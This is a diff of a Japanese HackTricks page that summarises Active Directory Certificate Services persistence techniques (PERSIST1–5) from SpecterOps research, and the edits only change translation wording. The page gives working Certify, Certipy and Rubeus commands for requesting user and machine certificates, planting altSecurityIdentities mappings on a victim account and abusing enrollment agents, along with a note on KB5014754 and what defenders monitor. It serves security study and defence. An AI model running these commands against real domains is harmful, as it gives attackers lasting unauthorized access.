@@ -2,13 +2,13 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-**これは、[https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)の素晴らしい研究のアカウント持続性章の小さな要約です。**
+**これは、[https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) の素晴らしい研究のアカウント持続性章の小さな要約です。**
 
 ## 証明書を使用したアクティブユーザー資格情報の盗難の理解 – PERSIST1
 
-ユーザーがドメイン認証を許可する証明書を要求できるシナリオでは、攻撃者はこの証明書を要求して盗む機会を得て、ネットワーク上で持続性を維持することができます。デフォルトでは、Active Directoryの`User`テンプレートはそのような要求を許可しますが、場合によっては無効になっていることがあります。
+ドメイン認証を許可する証明書がユーザーによって要求できるシナリオでは、攻撃者はこの証明書を要求して盗む機会を持ち、ネットワーク上で持続性を維持することができます。デフォルトでは、Active Directoryの `User` テンプレートはそのような要求を許可しますが、場合によっては無効にされていることがあります。
 
-[Certify](https://github.com/GhostPack/Certify)や[Certipy](https://github.com/ly4k/Certipy)を使用して、クライアント認証を許可する有効なテンプレートを検索し、1つを要求することができます。
+[Certify](https://github.com/GhostPack/Certify) または [Certipy](https://github.com/ly4k/Certipy) を使用して、クライアント認証を許可する有効なテンプレートを検索し、1つを要求することができます：
 ```bash
 # Enumerate client-auth capable templates
 Certify.exe find /clientauth
@@ -32,11 +32,11 @@ Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /
 # Or with Certipy
 certipy auth -pfx user.pfx -dc-ip 10.0.0.10
 ```
-> 注: 他の技術と組み合わせることで（THEFTセクションを参照）、証明書ベースの認証はLSASSに触れることなく、さらには非特権コンテキストからも持続的なアクセスを可能にします。
+> 注: 他の技術と組み合わせることで（THEFTセクションを参照）、証明書ベースの認証は、LSASSに触れることなく、さらには非特権コンテキストからも持続的なアクセスを可能にします。
 
 ## 証明書を使用したマシンの持続性の獲得 - PERSIST2
 
-攻撃者がホスト上で特権を持っている場合、妥協したシステムのマシンアカウントをデフォルトの`Machine`テンプレートを使用して証明書に登録できます。マシンとして認証することで、ローカルサービスのためのS4U2Selfが有効になり、持続的なホストの持続性を提供できます:
+攻撃者がホスト上で特権を持っている場合、彼らはデフォルトの`Machine`テンプレートを使用して、侵害されたシステムのマシンアカウントに対して証明書を登録できます。マシンとして認証することで、ローカルサービスのためのS4U2Selfが有効になり、持続的なホストの持続性を提供することができます:
 ```bash
 # Request a machine certificate as SYSTEM
 Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine
@@ -80,12 +80,12 @@ $Map     = "X509:<I>$Issuer<SR>$SerialR"
 # Add mapping to victim. Requires rights to write altSecurityIdentities on the object
 Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
 ```
-その後、PFXで認証します。Certipyは直接TGTを取得します：
+次に、PFXで認証します。Certipyは直接TGTを取得します：
 ```bash
 certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
 ```
 ノート
-- 強いマッピングタイプのみを使用する: X509IssuerSerialNumber, X509SKI, または X509SHA1PublicKey。弱い形式（Subject/Issuer, Subject-only, RFC822 email）は非推奨であり、DCポリシーによってブロックされる可能性があります。
+- 強いマッピングタイプのみを使用する: X509IssuerSerialNumber、X509SKI、またはX509SHA1PublicKey。弱い形式（Subject/Issuer、Subject-only、RFC822メール）は非推奨であり、DCポリシーによってブロックされる可能性があります。
 - 証明書チェーンは、DCによって信頼されるルートに構築される必要があります。NTAuthのエンタープライズCAは通常信頼されており、一部の環境では公開CAも信頼されています。
 
 弱い明示的マッピングと攻撃経路についての詳細は、以下を参照してください:
@@ -94,9 +94,9 @@ certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
 domain-escalation.md
 {{#endref}}
 
-## エンロールメントエージェントを使用した持続性 – PERSIST5
+## エンロールメントエージェントを持続性として使用 – PERSIST5
 
-有効な証明書リクエストエージェント/エンロールメントエージェント証明書を取得すると、ユーザーの代わりに新しいログオン可能な証明書を自由に発行でき、エージェントPFXをオフラインで持続トークンとして保持できます。悪用ワークフロー:
+有効な証明書要求エージェント/エンロールメントエージェント証明書を取得すると、ユーザーの代わりに新しいログオン可能な証明書を自由に発行でき、エージェントPFXをオフラインで持続性トークンとして保持できます。悪用ワークフロー:
 ```bash
 # Request an Enrollment Agent cert (requires template rights)
 Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"
@@ -113,9 +113,9 @@ certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
 
 ## 2025年の強力な証明書マッピングの強制: 持続性への影響
 
-Microsoft KB5014754は、ドメインコントローラーにおける強力な証明書マッピングの強制を導入しました。2025年2月11日以降、DCはデフォルトで完全な強制に切り替わり、弱い/あいまいなマッピングを拒否します。実際の影響:
+Microsoft KB5014754は、ドメインコントローラーにおける強力な証明書マッピングの強制を導入しました。2025年2月11日以降、DCはデフォルトで完全な強制に切り替わり、弱い/曖昧なマッピングを拒否します。実際の影響:
 
-- SIDマッピング拡張がない2022年以前の証明書は、DCが完全な強制にある場合、暗黙のマッピングに失敗する可能性があります。攻撃者は、AD CSを通じて証明書を更新してSID拡張を取得するか、`altSecurityIdentities`に強力な明示的マッピングを植え付けることでアクセスを維持できます（PERSIST4）。
+- SIDマッピング拡張が欠如している2022年以前の証明書は、DCが完全な強制にある場合、暗黙のマッピングに失敗する可能性があります。攻撃者は、AD CSを通じて証明書を更新（SID拡張を取得）するか、`altSecurityIdentities`に強力な明示的マッピングを植え付けることでアクセスを維持できます（PERSIST4）。
 - 強力な形式（Issuer+Serial、SKI、SHA1-PublicKey）を使用した明示的マッピングは引き続き機能します。弱い形式（Issuer/Subject、Subject-only、RFC822）はブロックされる可能性があり、持続性のためには避けるべきです。
 
 管理者は以下を監視し、警告を出すべきです:
@@ -126,7 +126,7 @@ Microsoft KB5014754は、ドメインコントローラーにおける強力な�
 
 - Microsoft. KB5014754: Windowsドメインコントローラーにおける証明書ベースの認証の変更（強制タイムラインと強力なマッピング）。
 https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
-- Certipy Wiki – コマンドリファレンス（`req -renew`、`auth`、`shadow`）。
+- Certipy Wiki – コマンドリファレンス (`req -renew`, `auth`, `shadow`)。
 https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
 
 {{#include ../../../banners/hacktricks-training.md}}
